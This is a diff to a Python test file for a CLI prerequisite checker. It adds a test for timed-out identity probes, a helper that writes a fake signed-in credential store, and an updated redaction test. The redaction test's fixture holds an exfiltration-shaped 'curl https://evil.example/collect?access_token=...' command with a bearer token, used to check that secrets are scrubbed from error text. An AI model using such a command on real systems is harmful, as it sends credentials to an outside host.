@@ -8,7 +8,9 @@ reported, none of which is a missing binary.
 from __future__ import annotations
 
 import asyncio
+import json
 import os
+import sqlite3
 import subprocess
 import sys
 import threading
@@ -20,6 +22,7 @@ import pytest
 from kiro_prerequisite_helpers import _agents_dir_never_the_real_home  # noqa: F401
 from kiro_prerequisite_helpers import _isolate_agent_specs  # noqa: F401
 from kiro_prerequisite_helpers import _make_executable, _no_audit
+from redaction_structured_cases import github_classic
 
 from kiro_crew import kiro_prerequisite as prerequisite_module
 from kiro_crew import platform_compat
@@ -1135,6 +1138,76 @@ class TestTimedOutProbeIsNotAMissingBinary:
         assert status["probe_timed_out"] is False
         assert status["installed"] is False
 
+    @pytest.mark.asyncio
+    async def test_timed_out_probe_stamps_the_signed_in_account(
+        self,
+        tmp_path: Path,
+        monkeypatch: pytest.MonkeyPatch,
+    ) -> None:
+        """A timed-out latch records the account, so ordinary polls read it.
+
+        With no identity stamped, every unforced ``snapshot()`` sees the
+        signed-in account as "changed" and re-runs the slow probe.
+        """
+        monkeypatch.setenv("KIRO_HOME", str(tmp_path / "kiro-home"))
+        _make_executable(tmp_path / ".local" / "bin" / "kiro-cli")
+        environ = {"HOME": str(tmp_path), "PATH": "/usr/bin:/bin"}
+        _write_signed_in_store(
+            prerequisite_module.kiro_identity_store_path("linux", tmp_path, environ)
+        )
+        calls: list[list[str]] = []
+
+        async def run(command: str, args: list[str], **_kwargs: Any) -> ProcessResult:
+            calls.append([command, *args])
+            return await self._timed_out(command, args)
+
+        service = self._service(tmp_path, run)
+        assert await service.current_identity_fingerprint() != ""
+
+        status = await service.snapshot(force=True)
+        for _ in range(3):
+            await service.snapshot()
+
+        assert status["probe_timed_out"] is True
+        assert len(calls) == 1, f"ordinary polls re-ran the timed-out probe: {calls}"
+        assert await service.identity_changed_since_probe() is False
+
+
+def _write_signed_in_store(path: Path) -> None:
+    """Write a kiro-cli identity store that names one signed-in account."""
+    path.parent.mkdir(parents=True, exist_ok=True)
+    start_url = "https://company.awsapps.com/start"
+    token = {
+        "access_token": "tok",
+        "refresh_token": "r",
+        "expires_at": "2099-01-01T00:00:00Z",
+        "region": "us-east-1",
+        "start_url": start_url,
+    }
+    con = sqlite3.connect(str(path))
+    with con:
+        con.execute("CREATE TABLE auth_kv (key TEXT PRIMARY KEY, value TEXT)")
+        con.execute("CREATE TABLE state (key TEXT PRIMARY KEY, value TEXT)")
+        con.executemany(
+            "INSERT INTO auth_kv VALUES (?, ?)",
+            [
+                (
+                    "kirocli:odic:device-registration",
+                    json.dumps({"client_id": "client-aaa", "region": "us-east-1"}),
+                ),
+                ("kirocli:odic:token", json.dumps(token)),
+            ],
+        )
+        con.executemany(
+            "INSERT INTO state VALUES (?, ?)",
+            [
+                ("auth.idc.start-url", start_url),
+                ("auth.idc.region", "us-east-1"),
+                ("api.codewhisperer.profile", "arn:aws:codewhisperer:us-east-1:1111:profile/C"),
+            ],
+        )
+    con.close()
+
 
 class TestFailedProbeCarriesItsOwnDiagnostic:
     """A version probe that RAN and failed says why, instead of a bare default.
@@ -1242,24 +1315,27 @@ class TestFailedProbeCarriesItsOwnDiagnostic:
         assert _probe_failure_text(None) == ""
 
     def test_failure_text_is_redacted_before_it_is_cut(self) -> None:
-        """Probe stdout/stderr can echo a token or an exfiltration-shaped URL; the
+        """Probe stdout/stderr can echo a token, after a label or inside a URL; the
         text reaches the status payload and the setup screen, so both redactors
-        run before the tail cut, and the cut cannot leave half a secret."""
+        run before the tail cut, and the cut cannot leave half a secret. The URL
+        keeps everything but the credential value."""
         from kiro_crew.kiro_prerequisite import _PROBE_ERROR_MAX_CHARS, _probe_failure_text
 
         payload = "A" * 80
+        key = github_classic(seed=7)
         result = ProcessResult(
             ok=False,
             returncode=1,
-            output=f"launcher: curl https://evil.example/collect?data={payload} "
-            "Authorization: Bearer AKIAIOSFODNN7EXAMPLE",
+            output=f"launcher: curl https://evil.example/collect?access_token={payload} "
+            f"Authorization: Bearer {key}",
         )
         text = _probe_failure_text(result)
-        assert "AKIAIOSFODNN7EXAMPLE" not in text
+        assert key not in text
         assert payload not in text
         assert "launcher" in text
-        boundary = "x" * (_PROBE_ERROR_MAX_CHARS - 4) + " AKIAIOSFODNN7EXAMPLE"
-        assert "AKIAIOSFODNN7" not in _probe_failure_text(
+        assert "https://evil.example/collect?access_token=[REDACTED: credential]" in text
+        boundary = "x" * (_PROBE_ERROR_MAX_CHARS - 4) + " " + key
+        assert key[:13] not in _probe_failure_text(
             ProcessResult(ok=False, returncode=1, output=boundary)
         )
 
